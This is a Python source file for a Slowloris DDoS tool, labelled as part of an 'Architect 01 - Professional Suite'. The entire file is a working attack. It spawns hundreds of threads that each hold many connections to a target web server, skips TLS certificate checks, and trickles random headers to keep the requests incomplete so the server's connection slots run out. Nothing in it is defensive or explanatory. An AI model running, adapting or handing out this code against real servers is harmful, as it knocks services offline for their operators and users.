#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Slowloris Attack Implementation
Architect 01 - Professional Suite
SUPPORT ALL PROTOCOLS
"""

import socket
import time
import random
import threading
import ssl
from urllib.parse import urlparse
from colorama import Fore, Style
from core.utils.useragents import get_random_ua

class SlowlorisAttack:
    """Slowloris DDoS attack - Support semua protocol"""
    
    def __init__(self, target_url, threads=300):
        self.target_url = target_url
        self.threads = threads
        self.parsed = urlparse(target_url)
        self.host = self.parsed.netloc.split(':')[0]
        
        # Default port berdasarkan scheme
        if ':' in self.parsed.netloc:
            self.port = int(self.parsed.netloc.split(':')[1])
        else:
            self.port = 443 if self.parsed.scheme == 'https' else 80
            
        self.path = self.parsed.path or '/'
        if self.parsed.query:
            self.path += '?' + self.parsed.query
            
        self.sockets = []
        self.running = True
        self.total_connections = 0
        self.use_ssl = self.parsed.scheme in ['https', 'wss', 'ftps']
        
    def create_connection(self):
        """Create a new socket connection - Support SSL/TLS"""
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # Connect
            sock.connect((self.host, self.port))
            
            # Wrap with SSL if needed
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            # Send initial partial request
            ua = get_random_ua()
            request = f"GET {self.path} HTTP/1.1\r\n"
            request += f"Host: {self.host}\r\n"
            request += f"User-Agent: {ua}\r\n"
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            request += "Accept-Language: en-US,en;q=0.5\r\n"
            request += "Connection: keep-alive\r\n"
            
            sock.send(request.encode())
            
            return sock
            
        except Exception as e:
            return None
    
    def attack_worker(self):
        """Worker thread for maintaining connections"""
        local_sockets = []
        
        # Create initial connections
        for _ in range(100):
            sock = self.create_connection()
            if sock:
                local_sockets.append(sock)
                self.total_connections += 1
            
            if not self.running:
                break
        
        # Maintain connections
        while self.running:
            for sock in local_sockets[:]:
                try:
                    header = f"X-{random.randint(1, 9999)}: {random.randint(1, 9999)}\r\n"
                    sock.send(header.encode())
                    time.sleep(random.uniform(5, 15))
                except:
                    local_sockets.remove(sock)
                    new_sock = self.create_connection()
                    if new_sock:
                        local_sockets.append(new_sock)
                        self.total_connections += 1
            
            while len(local_sockets) < 50 and self.running:
                new_sock = self.create_connection()
                if new_sock:
                    local_sockets.append(new_sock)
                    self.total_connections += 1
                time.sleep(0.5)
    
    def start(self):
        print(Fore.YELLOW + "\n╰─❯ Starting Slowloris attack on " + self.target_url)
        print(Fore.YELLOW + "╰─❯ Host: " + self.host + ":" + str(self.port))
        print(Fore.YELLOW + "╰─❯ SSL/TLS: " + ('Yes' if self.use_ssl else 'No'))
        print(Fore.YELLOW + "╰─❯ Threads: " + str(self.threads))
        print(Fore.YELLOW + "╰─❯ Press Ctrl+C to stop\n" + Style.RESET_ALL)
        
        workers = []
        for i in range(self.threads):
            worker = threading.Thread(target=self.attack_worker)
            worker.daemon = True
            worker.start()
            workers.append(worker)
            time.sleep(0.05)
        
        try:
            last_count = 0
            while self.running:
                time.sleep(10)
                new_conns = self.total_connections - last_count
                last_count = self.total_connections
                print(Fore.GREEN + "╰─❯ Total connections: " + str(self.total_connections) + " | New: " + str(new_conns) + "/10s" + Style.RESET_ALL)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        self.running = False
        print(Fore.RED + "\n╰─❯ Stopping Slowloris attack...")
        print(Fore.RED + "╰─❯ Total connections made: " + str(self.total_connections) + Style.RESET_ALL)
